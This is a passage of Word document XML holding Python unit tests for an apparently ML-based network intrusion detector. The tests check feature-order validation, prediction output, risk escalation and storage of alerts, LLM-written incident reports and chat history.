        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return Detector(str(MODEL), str(SCHEMA))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25AF934D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3B423EFF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7D18B65C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_detector_rejects_reordered_features(detector):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19CDBF28">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """回归：列序错了不会报错，只会把"目的端口"当"流时长"去推理。必须当场拒收。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AAA1969">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    bad = list(reversed(detector.feature_names))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BC95BCE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    with pytest.raises(ValueError):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30B079F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        detector.check_features(bad)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DFC5BC4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    detector.check_features(detector.feature_names)  # 正确列序不抛</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33BB703A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C2236FF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0468C475">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_predict_batch_returns_class_names_not_indices(detector):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BB82E99">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    x = np.zeros((3, len(detector.feature_names)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75745CEA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    out = detector.predict_batch(x)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5415F46F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert len(out) == 3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47E841EB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for row in out:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E64DEC4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        assert row["category"] in detector.classes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FA0C647">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        assert 0.0 &lt;= row["confidence"] &lt;= 1.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33545B7F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        assert row["risk"] in ("info", "low", "medium", "high", "critical")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CC7F344">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        assert pytest.approx(sum(row["proba"].values()), abs=1e-4) == 1.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7317D81A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2B3922F6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="46982F19">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_top_features_returns_k_items(detector):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63474524">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    x = np.zeros(len(detector.feature_names))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B004721">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    items = detector.top_features(x, k=5)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="483550B8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert len(items) == 5</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41DF3AD1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert all("feature" in it and "z_score" in it for it in items)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="415263D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="08E05CCB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5A339A81">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_escalate_respects_confidence():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06214DBC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert escalate("high", 0.999) == "critical"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2592D3BB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert escalate("high", 0.90) == "high"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E8A4BB8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert escalate("high", 0.30) == "medium"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09709247">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="67DE3B7F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="62D262AF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># ------------------------------------------------------------------ 存储</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DEFE1D9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="711A14F4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="657D1C69">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_store_roundtrip(tmp_path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EECD9A5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    store = Store(str(tmp_path / "t.db"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="761066E2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    fid = store.add_flow("probe-a", 1.0, 2.0, "6|1.1.1.1|1|2.2.2.2|80", "PortScan", 0.9, {"x": 1})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50E1B56E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    aid = store.add_alert("probe-a", "6|1.1.1.1|1|2.2.2.2|80", "PortScan", 0.9, "high",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="214E3EF4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                          {"x": 1}, [{"feature": "SYN Flag Count", "value": 5}])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23A1A1C4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    rid = store.add_report(aid, "### 事件概述\n扫描", "deepseek-chat", 120)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E2C298B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    store.add_chat(rid, "user", "为什么？")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E44BC9A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    store.add_chat(rid, "assistant", "因为 SYN 计数高")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6445CC2E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D73273C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert fid and aid and rid</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F090B02">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    alert = store.alert(aid)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28112357">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert alert["category"] == "PortScan"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F89DD7B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert alert["evidence"][0]["feature"] == "SYN Flag Count"   # JSON 已还原成对象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31AFEE6B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert store.report_for_alert(aid)["content"].startswith("### 事件概述")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EE61AE4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert len(store.chat_history(rid)) == 2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64EA0279">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="15BF731E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    st = store.stats(since=0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="050BB3E2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert st["total_flows"] == 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="720036C0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert st["by_prediction"] == {"PortScan": 1}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="042E2EA6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert st["by_protocol"] == {"6": 1}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17B9C8BC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="42E1F420">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5047BE9D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_store_report_is_json_decoded_not_string(tmp_path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B940C41">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """回归：features/evidence 存的是 JSON 文本，读出来不还原就等于看板拿不到证据。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32B3EDC6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    store = Store(str(tmp_path / "t2.db"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30B24D1F">
      <w:pPr>
        <w:widowControl w:val="0"/>
